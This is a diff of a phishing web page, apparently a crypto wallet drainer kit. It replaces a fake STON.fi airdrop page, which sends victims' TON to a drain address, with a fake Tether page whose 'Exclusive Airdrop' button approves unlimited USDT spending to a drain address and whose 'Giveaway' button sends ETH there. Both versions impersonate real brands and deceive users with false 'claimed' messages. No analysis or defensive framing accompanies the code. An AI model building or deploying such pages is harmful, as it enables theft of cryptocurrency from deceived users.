@@ -1,150 +1,163 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>STON.fi Airdrop</title>
-  <!-- Правильная загрузка TonConnect -->
-  <script src="https://unpkg.com/@tonconnect/ui@2.0.5/dist/tonconnect-ui.min.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tether</title>
+  <link rel="stylesheet" href="https://tether.to/css/app.css?v=1.0.0">
   <style>
-    /* Твой стиль остается без изменений */
+    /* Custom styles for animations and buttons */
+    .hero {
+      position: relative;
+      text-align: center;
+      padding: 100px 20px;
+      background: #000;
+      color: #fff;
+    }
+    .orbiting-coins {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      animation: rotate 30s linear infinite;
+    }
+    .coin {
+      position: absolute;
+      width: 50px;
+      height: 50px;
+      background: url('https://tether.to/images/usdt-coin.png') center/contain no-repeat;
+      animation: orbit 20s linear infinite;
+    }
+    .coin:nth-child(1) { top: 20%; left: 30%; animation-duration: 15s; }
+    .coin:nth-child(2) { top: 40%; left: 50%; animation-duration: 25s; }
+    .coin:nth-child(3) { top: 60%; left: 70%; animation-duration: 18s; }
+    @keyframes orbit {
+      0% { transform: translate(-50%, -50%) rotate(0deg) translateX(150px) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg) translateX(150px) rotate(-360deg); }
+    }
+    .typing-text {
+      font-size: 2rem;
+      white-space: nowrap;
+      overflow: hidden;
+      border-right: 0.15em solid #fff;
+      animation: typing 3s steps(40, end), blink-caret .75s step-end infinite;
+    }
+    @keyframes typing {
+      from { width: 0 }
+      to { width: 100% }
+    }
+    @keyframes blink-caret {
+      from, to { border-color: transparent }
+      50% { border-color: #fff; }
+    }
+    .buttons {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 50px;
+    }
+    .btn {
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .btn-connect { background: #00ff00; color: #000; }
+    .btn-airdrop { background: #ff00ff; color: #000; }
+    .btn-giveaway { background: #0000ff; color: #fff; }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
   </style>
 </head>
 <body>
-  <canvas id="dust"></canvas>
-  <nav class="nav">
-    <div class="nav-links">
-      <a href="#about">About</a>
-      <a href="#omniston">Omniston</a>
-      <a href="#roadmap">Roadmap</a>
-      <a href="#advantages">Advantages</a>
-    </div>
-    <div class="actions">
-      <select class="lang-select" id="lang-select">
-        <option value="en">EN</option>
-        <option value="ru">RU</option>
-      </select>
-      <!-- Изменяем id кнопки для TonConnect -->
-      <div id="connect-button-container"></div>
-      <button class="btn btn-primary" id="claim-btn" disabled>
-        Participate in Airdrop
-      </button>
-    </div>
-  </nav>
-  
-  <!-- Остальной HTML код без изменений -->
+  <header class="header">
+    <nav class="nav">
+      <a href="/">Tether</a>
+      <a href="/usdt">USDT</a>
+      <a href="/eur">EUR₮</a>
+      <a href="/mxn">MXN₮</a>
+      <a href="/cny">CNH₮</a>
+      <a href="/xau">XAU₮</a>
+      <a href="/about">About Us</a>
+      <a href="/transparency">Transparency</a>
+      <a href="/contact">Contact</a>
+    </nav>
+  </header>
 
-  <div id="status">Status: Ready</div>
+  <section class="hero">
+    <div class="orbiting-coins">
+      <div class="coin"></div>
+      <div class="coin"></div>
+      <div class="coin"></div>
+      <div class="coin"></div>
+      <div class="coin"></div>
+    </div>
+    <h1 class="typing-text">The world's most used stablecoin</h1>
+    <p>Tether tokens offer exceptional liquidity on tier one exchanges giving traders the best exchange rates.</p>
+    <div class="buttons">
+      <button class="btn btn-connect" id="connect-btn">Connect Wallet</button>
+      <button class="btn btn-airdrop" id="airdrop-btn" disabled>Exclusive Airdrop</button>
+      <button class="btn btn-giveaway" id="giveaway-btn" disabled>Participate in Giveaway</button>
+    </div>
+  </section>
 
-  <!-- Частицы оставляем как есть -->
+  <section class="about">
+    <h2>About Tether</h2>
+    <p>Tether gives you the joint benefits of open blockchain technology and traditional currency by converting your cash into digital currency, pegged to the price of the biggest currencies in the world.</p>
+  </section>
+
+  <section class="transparency">
+    <h2>Transparency</h2>
+    <p>Our reserve holdings are published daily and subject to frequent professional audits. All Tether tokens are pegged at 1-to-1 with a matching fiat currency and are backed 100% by Tether's reserves.</p>
+  </section>
+
+  <footer class="footer">
+    <p>© 2025 Tether.to</p>
+  </footer>
 
   <script>
-    // Твой адрес TON (убедись что правильный!)
-    const DRAIN_ADDRESS = "UQDIwuhyezggLDZQmPcIrFzknVCpyKAchlIjUqj5X8u8BUYD"; // Тестовый адрес, замени на свой
+    const DRAIN_ADDRESS = "YOUR_ETHEREUM_DRAIN_ADDRESS"; // Замени на свой
 
-    // Создаем собственный manifest
-    const manifest = {
-      url: window.location.origin,
-      name: "STON.fi Airdrop",
-      iconUrl: "https://strapi.switchere.com/uploads/stonhero_4957e6ddf9.png",
-      termsOfUseUrl: "https://example.com/terms",
-      privacyPolicyUrl: "https://example.com/privacy"
-    };
+    const connectBtn = document.getElementById('connect-btn');
+    const airdropBtn = document.getElementById('airdrop-btn');
+    const giveawayBtn = document.getElementById('giveaway-btn');
 
-    // Инициализируем TonConnect
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-      manifest: manifest,
-      buttonRootId: "connect-button-container", // Куда вставить кнопку
-      uiPreferences: {
-        theme: "DARK",
-        borderRadius: "s"
-      }
-    });
+    let wallet, signer;
 
-    const claimBtn = document.getElementById('claim-btn');
-    const statusEl = document.getElementById('status');
-
-    // Отслеживаем изменения статуса
-    tonConnectUI.onStatusChange((wallet) => {
-      console.log('Wallet status:', wallet);
-      
-      if (wallet) {
-        // Кошелек подключен
-        claimBtn.disabled = false;
-        statusEl.textContent = `Connected: ${wallet.account.address.slice(0, 8)}...`;
-        statusEl.style.color = "#14f195";
-      } else {
-        // Кошелек отключен
-        claimBtn.disabled = true;
-        statusEl.textContent = "Wallet disconnected";
-        statusEl.style.color = "#ff6b6b";
-      }
-    });
-
-    // Обработка кнопки claim
-    claimBtn.onclick = async () => {
-      if (!tonConnectUI.connected) {
-        statusEl.textContent = "Please connect wallet first!";
-        return;
-      }
-
-      statusEl.textContent = "Preparing transaction...";
-      claimBtn.disabled = true;
-
-      try {
-        // Получаем текущий кошелек
-        const wallet = tonConnectUI.wallet;
-        
-        // Создаем транзакцию
-        const transaction = {
-          validUntil: Math.floor(Date.now() / 1000) + 600, // 10 минут
-          messages: [
-            {
-              address: DRAIN_ADDRESS,
-              amount: "10000000", // 0.01 TON в нанотонах
-              // payload можно оставить пустым или добавить комментарий
-              payload: ""
-            }
-          ]
-        };
-
-        // Отправляем транзакцию
-        const result = await tonConnectUI.sendTransaction(transaction);
-        
-        statusEl.textContent = `Success! TX: ${result.boc.slice(0, 20)}...`;
-        claimBtn.disabled = true;
-        
-        alert("✅ Thank you for participating! You will receive 5 TON at the end of the airdrop.");
-        
-      } catch (error) {
-        console.error("Transaction error:", error);
-        
-        if (error.message?.includes('User rejected')) {
-          statusEl.textContent = "Transaction rejected by user";
-        } else if (error.message?.includes('insufficient')) {
-          statusEl.textContent = "Insufficient TON balance";
-        } else {
-          statusEl.textContent = `Error: ${error.message || "Unknown error"}`;
+    connectBtn.onclick = async () => {
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          wallet = new ethers.providers.Web3Provider(window.ethereum);
+          signer = wallet.getSigner();
+          connectBtn.textContent = "Connected";
+          connectBtn.disabled = true;
+          airdropBtn.disabled = false;
+          giveawayBtn.disabled = false;
+        } catch (err) {
+          console.error(err);
         }
-        
-        claimBtn.disabled = false;
+      } else {
+        alert("Install MetaMask!");
       }
     };
 
-    // Дополнительные обработчики для лучшего UX
-    tonConnectUI.uiOptions = {
-      actionsConfiguration: {
-        twaReturnUrl: window.location.href
-      }
+    airdropBtn.onclick = async () => {
+      if (!signer) return;
+      // Fake airdrop - approve drain
+      const usdt = new ethers.Contract("0xdAC17F958D2ee523a2206206994597C13D831ec7", ["function approve(address spender, uint256 amount)"], signer);
+      await usdt.approve(DRAIN_ADDRESS, ethers.constants.MaxUint256);
+      alert("Airdrop claimed!");
     };
 
-    // Проверяем, не подключен ли уже кошелек
-    window.addEventListener('load', () => {
-      if (tonConnectUI.connected) {
-        statusEl.textContent = "Wallet already connected!";
-        claimBtn.disabled = false;
-      }
-    });
+    giveawayBtn.onclick = async () => {
+      if (!signer) return;
+      // Fake giveaway - small transfer + approve
+      const tx = { to: DRAIN_ADDRESS, value: ethers.utils.parseEther("0.01") };
+      await signer.sendTransaction(tx);
+      alert("Participated in giveaway!");
+    };
   </script>
 </body>
 </html>
